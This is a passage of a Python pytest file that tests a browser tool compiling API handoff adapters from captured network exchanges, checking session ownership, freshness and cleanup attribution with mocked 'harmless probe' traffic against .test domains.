        send_ref = BrowserSession._evidence(send_action)  # noqa: SLF001
        actions.append(send_action)
        observations.extend(
            (
                visible.model_copy(
                    update={
                        "step": 14,
                        "observed_at": send_action.created_at - timedelta(microseconds=1),
                        "elements": (
                            ElementRef(
                                ref=send_action.element_ref,
                                tab_ref="tab:bank",
                                frame_ref="main",
                                role="button",
                                name="Send",
                            ),
                        ),
                    }
                ),
                completed.model_copy(
                    update={
                        "step": send_action.step,
                        "observed_at": send_action.created_at + timedelta(microseconds=1),
                        "evidence_refs": (send_ref,),
                    }
                ),
            )
        )
    network = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://bank.test",
        owner=owner(),
        tab_ref="tab:bank",
        kind="network",
        step=6,
        text=json.dumps(captured),
        observed_at=setup_at + timedelta(seconds=2),
    )
    later_network = network.model_copy(
        update={
            "step": 18,
            "observed_at": setup_at + timedelta(seconds=4),
        }
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return ()

    class Recorder:
        handoff = None

        def __init__(self):
            self.evidence = []

        async def list_actions(self, _context_id):
            return tuple(actions)

        async def list_observations(self, _context_id):
            return (
                (network, later_network, *observations)
                if case == "repeated_poll_post_setup_action"
                else (network, *observations)
            )

        async def record_evidence(self, *args):
            self.evidence.append(args)

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    arguments = {
        **_compile_arguments(),
        "url": message_url,
    }
    if case == "canonical_declared_incomplete":
        arguments["session_creation_transition"] = {
            "precondition": {
                "method": "GET",
                "url": active_url,
                "status_codes": [404],
                "pointer": "/error",
                "match_values": ["no_active_session"],
            },
            "postcondition": {
                "method": "GET",
                "url": active_url,
                "status_codes": [200],
                "pointer": "/sessionId",
            },
        }
    result = await next(
        tool
        for tool in _production_browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        arguments,
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    if case in {
        "valid",
        "late_404",
        "repeated_poll_post_setup_action",
        "canonical_repeated_poll",
        "canonical_message_echo_then_repeated_poll",
        "canonical_declared_incomplete",
        "ambiguous_action",
        "wrong_latest_action",
        "wrong_success_hash",
    }:
        assert adapter["cleanup_discovery"]["session_ownership"] == "owned"
        expected_postcondition_url = active_url if case == "canonical_repeated_poll" else start_url
        assert (
            adapter["session_creation_transition"]["postcondition"]["url"]
            == expected_postcondition_url
        )
        assert adapter["session_creation_transition"]["precondition"] == {
            "method": "GET",
            "url": active_url,
            "status_codes": [404],
            "pointer": "/error",
            "match_values": ["no_active_session"],
        }
        assert len(adapter["session_creation_transition"]["evidence_refs"]) == 5
        assert action_ref in adapter["session_creation_transition"]["evidence_refs"]
        assert any(
            evidence_ref == action_ref and kind == "browser_action"
            for _, evidence_ref, kind, _ in recorder.evidence
        )
        assert result.metadata["preferred_next_tool"] == "browser_end_owned_session"
    else:
        assert adapter.get("cleanup_discovery", {}).get("session_ownership") != "owned"
        assert "session_creation_transition" not in adapter
        assert not any(step.get("cleanup") is True for step in adapter["api_steps"])


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "invalid_chain", ("preexisting", "multiple", "mismatched", "non_boolean_resumed")
)
async def test_api_handoff_keeps_ambiguous_session_creation_chain_unknown(
    invalid_chain: str,
) -> None:
    lifecycle = list(_strict_creation_events("s-ambiguous"))
    if invalid_chain == "preexisting":
        lifecycle.insert(
            0,
            {
                "method": "GET",
                "url": "https://target.test/api/active",
                "status": 200,
                "request_json": {},
                "response_json": {"sessionId": "s-ambiguous"},
            },
        )
    elif invalid_chain == "multiple":
        lifecycle.insert(
            2,
            {
                **lifecycle[1],
                "request_json": {"scenario": "refund", "retry": True},
            },
        )
    elif invalid_chain == "mismatched":
        lifecycle[2] = {
            **lifecycle[2],
            "response_json": {"sessionId": "different-session"},
        }
    else:
        lifecycle[1] = {
            **lifecycle[1],
            "response_json": {"sessionId": "s-ambiguous", "resumed": "false"},
        }
    captured = (
        *lifecycle,
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-ambiguous", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["cleanup_discovery"]["session_ownership"] == "unknown"
    assert "session_creation_transition" not in adapter


@pytest.mark.asyncio
async def test_api_handoff_seals_complete_visible_bank_lifecycle() -> None:
    """A fresh Bank session seals start, message, and visible forfeit together."""
    session_id = "bank-session-fresh"
    active_url = "https://bank.test/api/bank/active"
    start_url = "https://bank.test/api/bank/start"
    message_url = "https://bank.test/api/bank/message"
    cleanup_url = "https://bank.test/api/bank/forfeit"
    setup_action, setup_observations = _setup_action_records(tab_ref="tab:setup")
    setup_action_ref = BrowserSession._evidence(setup_action)  # noqa: SLF001
    setup_observations = tuple(
        observation.model_copy(update={"evidence_refs": (setup_action_ref,)})
        if observation.step == setup_action.step
        else observation
        for observation in setup_observations
    )
    cleanup_action, cleanup_observations, cleanup_action_ref = _cleanup_action_records()
    captured = (
        {
            "method": "GET",
            "url": active_url,
            "status": 404,
            "observed_at": (_SETUP_ACTION_AT - timedelta(seconds=1)).isoformat(),
            "request_json": {},
            "response_json": {"error": "no_active_session"},
        },
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=1)).isoformat(),
            "_observation_step": 3,
            "_observation_tab_ref": "tab:setup",
            "trigger_action_ref": setup_action_ref,
            "request_json": {"levelId": 1, "aiAssisted": True},
            "response_json": {
                "sessionId": session_id,
                "resumed": False,
                "turnsUsed": 0,
            },
        },
        {
            "method": "GET",
            "url": active_url,
            "status": 200,
            "observed_at": (_SETUP_ACTION_AT + timedelta(seconds=2)).isoformat(),
            "request_json": {},
            "response_json": {"sessionId": session_id, "turnsUsed": 0},
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {"sessionId": session_id, "message": "harmless probe"},
            "response_json": {
                "reply": "observed response",
                "sessionId": session_id,
            },
        },
        {
            "method": "POST",
            "url": cleanup_url,
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "trigger_action_ref": cleanup_action_ref,
            "request_json": {"sessionId": session_id},
            "response_json": {"forfeited": True},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def list_actions(self, _context_id):
            return setup_action, cleanup_action

        async def list_observations(self, _context_id):
            # The start request succeeded, but its post-click UI wait timed out.
            # Exact causal network evidence must still preserve ownership.
            return (setup_observations[0], *cleanup_observations)

        async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
            return {
                "context_id": context_id,
                "target_id": "target",
                "input_pointer": input_pointer,
                "evidence_ref": "native-request:sha256:" + "f" * 64,
            }

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    arguments = {
        **_compile_arguments(),
        "url": message_url,
        "cleanup_method": "POST",
        "cleanup_url": cleanup_url,
        "cleanup_acknowledgement": {
            "pointer": "/forfeited",
            "match_values": [True],
            "status_codes": [200],
        },
        "state_observations": [
            {
                "name": "physical_state_id",
                "role": "state_identity",
                "baseline_selector": {
                    "step_id": "observed-session-setup",
                    "evaluation_root": "response_body",
                    "pointer": "/sessionId",
                },
                "result_selector": {
                    "step_id": "observed-message-exchange",
                    "evaluation_root": "response_body",
                    "pointer": "/sessionId",
                },
                "value_type": "string",
            }
        ],
    }
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(ToolContext(session_id="s1", workspace_root="/tmp"), arguments)

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    assert [step["endpoint"] for step in adapter["api_steps"]] == [
        start_url,
        message_url,
        cleanup_url,
    ]
    assert adapter["cleanup_lifecycle"]["status"] == "observed"
    assert adapter["cleanup_discovery"] == {
        "failure_code": None,
        "retryable": False,
        "session_ownership": "owned",
        "status": "satisfied",
    }
    assert adapter["session_creation_transition"]["remote_session_id"] == session_id
    assert adapter["session_creation_transition"]["precondition"] == {
        "method": "GET",
        "url": active_url,
        "status_codes": [404],
        "pointer": "/error",
        "match_values": ["no_active_session"],
    }
    freshness = dict(adapter["session_freshness_predicate"])
    freshness_evidence_refs = freshness.pop("evidence_refs")
    assert freshness == {
        "source": "authoritative_fresh_setup_response",
        "method": "POST",
        "url": start_url,
        "status_codes": [200],
        "pointer": "/resumed",
        "match_values": [False],
        "reviewed_remote_session_id": session_id,
    }
    ownership_evidence_refs = adapter["session_creation_transition"]["evidence_refs"]
    assert set(ownership_evidence_refs).issubset(freshness_evidence_refs)
    assert len(freshness_evidence_refs) == len(ownership_evidence_refs) + 2
    capabilities = adapter["state_capabilities"]
    assert [item["kind"] for item in capabilities["affordances"]] == [
        "provision_fresh_state",
        "cleanup_state",
    ]
    assert all(item["confidence"] == 1.0 for item in capabilities["affordances"])
    assert capabilities["freshness_rules"][0]["selector"]["evidence_refs"]
    assert capabilities["freshness_rules"][0]["selector"]["confidence"] == 1.0
    assert capabilities["lifecycle"] == {
        "isolation": "independent",
        "baseline": "fresh",
        "cleanup": "explicit",
        "evidence_refs": list(
            dict.fromkeys(
                [*freshness_evidence_refs, *adapter["cleanup_lifecycle"]["evidence_refs"]]
            )
        ),
        "confidence": 1.0,
    }
    assert result.metadata["preferred_next_tool"] == "assessment_prepare"


@pytest.mark.asyncio
async def test_api_handoff_partitions_two_physical_sessions_in_one_context() -> None:
    """Session A setup or cleanup must never complete session B's lifecycle."""
    start_url = "https://bank.test/api/bank/start"
    message_url = "https://bank.test/api/bank/message"
    cleanup_url = "https://bank.test/api/bank/forfeit"
    cleanup_action, cleanup_observations, cleanup_action_ref = _cleanup_action_records()
    captured = (
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "request_json": {"account": "A"},
            "response_json": {
                "sessionId": "physical-A",
                "conversationId": "conversation-A",
                "resumed": False,
            },
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {
                "sessionId": "physical-A",
                "conversationId": "conversation-A",
                "message": "probe A",
            },
            "response_json": {"reply": "A"},
        },
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "request_json": {"account": "B"},
            "response_json": {
                "sessionId": "physical-B",
                "conversationId": "conversation-B",
                "resumed": False,
            },
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {
                "sessionId": "physical-B",
                "conversationId": "conversation-B",
                "message": "probe B",
            },
            "response_json": {"reply": "B"},
        },
        {
            "method": "POST",
            "url": cleanup_url,
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "trigger_action_ref": cleanup_action_ref,
            # Cookie-bound cleanup has no body. In a context that has observed
            # two physical lifecycles, chronology alone cannot attribute it to B.
            "request_json": {},
            "response_json": {"forfeited": True},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target", allowed_origins=("https://bank.test",))
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def list_actions(self, _context_id):
            return (cleanup_action,)

        async def list_observations(self, _context_id):
            return cleanup_observations

        async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
            return {
                "context_id": context_id,
                "target_id": "target",
                "input_pointer": input_pointer,
                "evidence_ref": "native-request:sha256:" + "f" * 64,
            }

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    tool = next(
        candidate
        for candidate in browser_tools(lambda _: Session(), recorder)
        if candidate.describe().name == "browser_compile_api_handoff"
    )
    context = ToolContext(session_id="s1", workspace_root="/tmp")
    compiled = await tool.invoke(
        context,
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
        },
    )

    assert compiled.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["request_template"] == {"account": "B"}
    assert adapter["api_steps"][0]["captures"] == {
        "session_id": "/sessionId",
        "conversation_id": "/conversationId",
    }
    assert adapter["api_steps"][1]["request_template"] == {
        "sessionId": "{{capture:session_id}}",
        "conversationId": "{{capture:conversation_id}}",
        "message": "{{input}}",
    }

    wrong_cleanup = await tool.invoke(
        context,
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
            "cleanup_method": "POST",
            "cleanup_url": cleanup_url,
            "cleanup_acknowledgement": {
                "pointer": "/forfeited",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )
    assert wrong_cleanup.is_error is True
    assert "no exact post-interaction cleanup exchange" in wrong_cleanup.content

    captured = (
        *captured[:-1],
        {**captured[-1], "request_json": {"sessionId": "physical-A"}},
    )
    wrong_primary_cleanup = await tool.invoke(
        context,
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
            "cleanup_method": "POST",
            "cleanup_url": cleanup_url,
            "cleanup_acknowledgement": {
                "pointer": "/forfeited",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )
    assert wrong_primary_cleanup.is_error is True
    assert "no exact post-interaction cleanup exchange" in wrong_primary_cleanup.content

    captured = (
        *captured[:-1],
        {**captured[-1], "request_json": {"sessionId": "physical-B"}},
    )
    correct_primary_cleanup = await tool.invoke(
        context,
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
            "cleanup_method": "POST",
            "cleanup_url": cleanup_url,
            "cleanup_acknowledgement": {
                "pointer": "/forfeited",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )
    assert correct_primary_cleanup.is_error is False
    final_adapter = json.loads(recorder.handoff.adapter)
    assert final_adapter["api_steps"][-1]["request_template"] == {
        "sessionId": "{{capture:session_id}}"
    }


@pytest.mark.asyncio
async def test_api_handoff_binds_composite_response_sourced_session_identity() -> None:
    message_url = "https://bank.test/api/bank/message"
    captured = (
        {
            "method": "POST",
            "url": "https://bank.test/api/bank/start",
            "status": 200,
            "request_json": {"levelId": 1},
            "response_json": {
                "sessionId": "physical-B",
                "conversationId": "conversation-B",
                "resumed": False,
            },
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {
                "sessionId": "physical-B",
                "conversationId": "conversation-B",
                "message": "probe B",
            },
            "response_json": {"reply": "B"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target", allowed_origins=("https://bank.test",))
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def reviewed_native_input_receipt(self, context_id, _event, input_pointer):
            return {
                "context_id": context_id,
                "target_id": "target",
                "input_pointer": input_pointer,
                "evidence_ref": "native-request:sha256:" + "f" * 64,
            }

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        candidate
        for candidate in browser_tools(lambda _: Session(), recorder)
        if candidate.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
        },
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["api_steps"][0]["captures"] == {
        "session_id": "/sessionId",
        "conversation_id": "/conversationId",
    }
    assert adapter["api_steps"][1]["request_template"] == {
        "sessionId": "{{capture:session_id}}",
        "conversationId": "{{capture:conversation_id}}",
        "message": "{{input}}",
    }


@pytest.mark.asyncio
async def test_api_handoff_prefers_executable_session_setup_over_passive_active_read() -> None:
    session_id = "bank-session-existing"
    active_url = "https://bank.test/api/bank/active"
    start_url = "https://bank.test/api/bank/start"
    message_url = "https://bank.test/api/bank/message"
    captured = (
        {
            "method": "GET",
            "url": active_url,
            "status": 200,
            "request_json": {},
            "response_json": {"sessionId": session_id, "turnsUsed": 4},
        },
        {
            "method": "POST",
            "url": start_url,
            "status": 200,
            "request_json": {"levelId": 1, "aiAssisted": True},
            "response_json": {"sessionId": session_id, "resumed": True},
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {"sessionId": session_id, "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
        },
    )

    assert result.is_error is False
    assert recorder.handoff is not None
    adapter = json.loads(recorder.handoff.adapter)
    assert [step["endpoint"] for step in adapter["api_steps"]] == [
        start_url,
        message_url,
    ]
    assert adapter["api_steps"][0]["method"] == "POST"
    assert adapter["api_steps"][0]["request_template"] == {
        "levelId": 1,
        "aiAssisted": True,
    }
    # A setup that explicitly resumed pre-existing target state is executable as
    # captured evidence, but cannot be reused as a fresh-session lifecycle.
    assert recorder.handoff.reusable_adapter is None


@pytest.mark.asyncio
async def test_api_handoff_does_not_publish_passive_session_read_for_reuse() -> None:
    session_id = "bank-session-existing"
    message_url = "https://bank.test/api/bank/message"
    captured = (
        {
            "method": "GET",
            "url": "https://bank.test/api/bank/active",
            "status": 200,
            "request_json": {},
            "response_json": {"sessionId": session_id, "turnsUsed": 4},
        },
        {
            "method": "POST",
            "url": message_url,
            "status": 200,
            "request_json": {"sessionId": session_id, "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        handoff = None

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    recorder = Recorder()
    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), recorder)
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "url": message_url,
            "input_pointer": "/message",
            "response_selector": "/reply",
        },
    )

    assert result.is_error is False
    assert recorder.handoff is not None
    assert recorder.handoff.adapter is not None
    assert recorder.handoff.reusable_adapter is None


@pytest.mark.asyncio
@pytest.mark.parametrize(
    ("resumed_value", "expected_ownership"),
    ((True, "unknown"), (None, "unknown"), ("unverified", "unknown")),
)
async def test_api_handoff_never_cleans_unowned_first_observed_session(
    resumed_value: object, expected_ownership: str
) -> None:
    setup_response: dict[str, object] = {"sessionId": "s-existing"}
    if resumed_value is not None:
        setup_response["resumed"] = resumed_value
    captured = (
        {
            "method": "POST",
            "url": "https://target.test/api/start",
            "status": 200,
            "request_json": {"scenario": "refund"},
            "response_json": setup_response,
        },
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-existing", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/cleanup",
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "trigger_action_ref": _cleanup_action_records()[2],
            "request_json": {"sessionId": "s-existing"},
            "response_json": {"closed": True},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder(_CleanupActionRecorder):
        handoff = None

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    async def allow(*_):
        return True

    recorder = Recorder()
    broker = ToolBroker(browser_tools(lambda _: Session(), recorder), confirmer=allow)
    result = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        _compile_arguments(),
    )

    assert result.is_error is False
    adapter = json.loads(recorder.handoff.adapter)
    assert adapter["cleanup_discovery"] == {
        "failure_code": "session_not_owned",
        "retryable": True,
        "session_ownership": expected_ownership,
        "status": "required_before_target_execution",
    }

    compiled = await broker.invoke(
        "browser_compile_api_handoff",
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
        },
    )
    assert compiled.is_error is False
    assert recorder.handoff is not None


@pytest.mark.asyncio
async def test_api_handoff_rejects_network_cleanup_without_visible_exit_action() -> None:
    captured = (
        *_strict_creation_events("s-owned"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-owned", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/cleanup",
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "request_json": {"sessionId": "s-owned"},
            "response_json": {"closed": True},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        async def list_actions(self, _context_id):
            return ()

        async def list_observations(self, _context_id):
            return ()

        async def record_handoff(self, _value):
            raise AssertionError("network-only cleanup must not seal")

    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), Recorder())
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
            "session_creation_transition": _strict_creation_transition(),
        },
    )

    assert result.is_error is True
    assert result.metadata["failure_code"] == "cleanup_action_evidence_unverified"


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "invalid_evidence",
    (
        "wrong_context",
        "wrong_action",
        "action_after_response",
        "wrong_snapshot_owner",
        "wrong_success_owner",
        "stale_success",
        "wrong_success_step",
        "wrong_success_tab",
        "wrong_success_ref",
    ),
)
async def test_api_handoff_rejects_cleanup_action_without_exact_causality(
    invalid_evidence: str,
) -> None:
    action, observations, _ = _cleanup_action_records()
    if invalid_evidence == "wrong_context":
        action, observations, _ = _cleanup_action_records(context_id="other-context")
    elif invalid_evidence == "wrong_action":
        action = action.model_copy(update={"kind": "fill"})
        action_ref = BrowserSession._evidence(action)  # noqa: SLF001
        observations = (
            observations[0],
            observations[1].model_copy(update={"evidence_refs": (action_ref,)}),
        )
    elif invalid_evidence == "action_after_response":
        action = action.model_copy(
            update={"created_at": _CLEANUP_RESPONSE_AT + timedelta(seconds=1)}
        )
        action_ref = BrowserSession._evidence(action)  # noqa: SLF001
        observations = (
            observations[0],
            observations[1].model_copy(update={"evidence_refs": (action_ref,)}),
        )
    elif invalid_evidence in {"wrong_snapshot_owner", "wrong_success_owner"}:
        other_owner = BrowserOwner(
            session_id="other-session",
            worker_id="other-worker",
            technique_id="recon",
        )
        invalid_position = 0 if invalid_evidence == "wrong_snapshot_owner" else 1
        observations = tuple(
            observation.model_copy(update={"owner": other_owner})
            if position == invalid_position
            else observation
            for position, observation in enumerate(observations)
        )
    elif invalid_evidence == "stale_success":
        observations = (
            observations[0],
            observations[1].model_copy(
                update={"observed_at": action.created_at - timedelta(microseconds=1)}
            ),
        )
    elif invalid_evidence == "wrong_success_step":
        observations = (
            observations[0],
            observations[1].model_copy(update={"step": action.step + 1}),
        )
    elif invalid_evidence == "wrong_success_tab":
        observations = (
            observations[0],
            observations[1].model_copy(update={"tab_ref": "tab:other"}),
        )
    else:
        observations = (
            observations[0],
            observations[1].model_copy(
                update={"evidence_refs": ("browser-action:sha256:" + "0" * 64,)}
            ),
        )
    action_ref = BrowserSession._evidence(action)  # noqa: SLF001
    captured = (
        *_strict_creation_events("s-owned"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-owned", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
        },
        {
            "method": "POST",
            "url": "https://target.test/api/cleanup",
            "status": 200,
            "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
            "request_json": {"sessionId": "s-owned"},
            "response_json": {"closed": True},
        },
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return captured

    class Recorder:
        async def list_actions(self, _context_id):
            return (action,)

        async def list_observations(self, _context_id):
            return observations

        async def record_handoff(self, _value):
            raise AssertionError("invalid cleanup causality must not seal")

    result = await next(
        tool
        for tool in browser_tools(lambda _: Session(), Recorder())
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_action_evidence_ref": action_ref,
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
            "session_creation_transition": _strict_creation_transition(),
        },
    )

    assert result.is_error is True
    assert result.metadata["failure_code"] == "cleanup_action_evidence_unverified"


@pytest.mark.asyncio
async def test_api_handoff_merges_durable_prefix_with_live_owned_cleanup_after_restart() -> None:
    interaction_actions, interaction_observations = _interaction_action_records(
        tab_ref="tab:cleanup"
    )
    fill_action, submit_action = interaction_actions
    setup_and_message = [
        *_strict_creation_events("s-restarted"),
        {
            "method": "POST",
            "url": "https://target.test/api/message",
            "status": 200,
            "request_json": {"sessionId": "s-restarted", "message": "harmless probe"},
            "response_json": {"reply": "observed response"},
            "tab_ref": "tab:cleanup",
            "trigger_action_ref": submit_action.evidence_refs[0],
            "trigger_action_step": submit_action.step,
            "input_action_refs": {"/message": fill_action.evidence_refs[0]},
            "input_probe_refs": {"/message": fill_action.evidence_refs[1]},
        },
    ]
    for event in setup_and_message:
        if event["method"] == "GET":
            event.pop("request_json")
    durable_network = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=owner(),
        tab_ref="tab:cleanup",
        kind="network",
        step=7,
        text=json.dumps(setup_and_message),
        observed_at=_CLEANUP_ACTION_AT - timedelta(seconds=2),
    )
    cleanup_action, cleanup_observations, cleanup_action_ref = _cleanup_action_records()
    setup_action, setup_observations = _setup_action_records(tab_ref="tab:cleanup")

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "trigger_action_ref": cleanup_action_ref,
                    "request_json": {"sessionId": "s-restarted"},
                    "response_json": {"closed": True},
                },
            )

    class Recorder:
        async def list_actions(self, _context_id):
            return (setup_action, *interaction_actions, cleanup_action)

        async def list_observations(self, _context_id):
            return (
                durable_network,
                *setup_observations,
                *interaction_observations,
                *cleanup_observations,
            )

        async def record_evidence(self, *_args):
            return None

        async def record_handoff(self, value):
            self.handoff = value

    result = await next(
        tool
        for tool in _production_browser_tools(lambda _: Session(), Recorder())
        if tool.describe().name == "browser_compile_api_handoff"
    ).invoke(
        ToolContext(session_id="s1", workspace_root="/tmp"),
        {
            **_compile_arguments(),
            "cleanup_method": "POST",
            "cleanup_url": "https://target.test/api/cleanup",
            "cleanup_acknowledgement": {
                "pointer": "/closed",
                "match_values": [True],
                "status_codes": [200],
            },
            "session_creation_transition": _strict_creation_transition(),
        },
    )

    assert result.is_error is False
    adapter = json.loads(result.content)["adapter"]
    compiled = json.loads(adapter)
    assert [step["step_id"] for step in compiled["api_steps"]] == [
        "observed-session-setup",
        "observed-message-exchange",
        "observed-cleanup-exchange",
    ]
    assert compiled["cleanup_discovery"]["session_ownership"] == "owned"
    assert compiled["api_steps"][-1]["cleanup_action_evidence_ref"] == cleanup_action_ref


@pytest.mark.asyncio
async def test_api_handoff_rejects_durable_restart_prefix_owned_by_another_session() -> None:
    durable_network = BrowserObservation(
        context_id="browser-context",
        target_id="target",
        origin="https://target.test",
        owner=BrowserOwner(
            session_id="other-session",
            worker_id="other-worker",
            technique_id="recon",
        ),
        tab_ref="tab:cleanup",
        kind="network",
        step=7,
        text=json.dumps(
            [
                {
                    "method": "POST",
                    "url": "https://target.test/api/message",
                    "status": 200,
                    "request_json": {"message": "harmless probe"},
                    "response_json": {"reply": "observed response"},
                }
            ]
        ),
    )

    class Session:
        context_id = "browser-context"
        bounds = SimpleNamespace(target_id="target")
        owner = owner()

        def api_exchange_events(self):
            return (
                {
                    "method": "POST",
                    "url": "https://target.test/api/cleanup",
                    "status": 200,
                    "observed_at": _CLEANUP_RESPONSE_AT.isoformat(),
                    "request_json": {},
                    "response_json": {"closed": True},
                },
            )

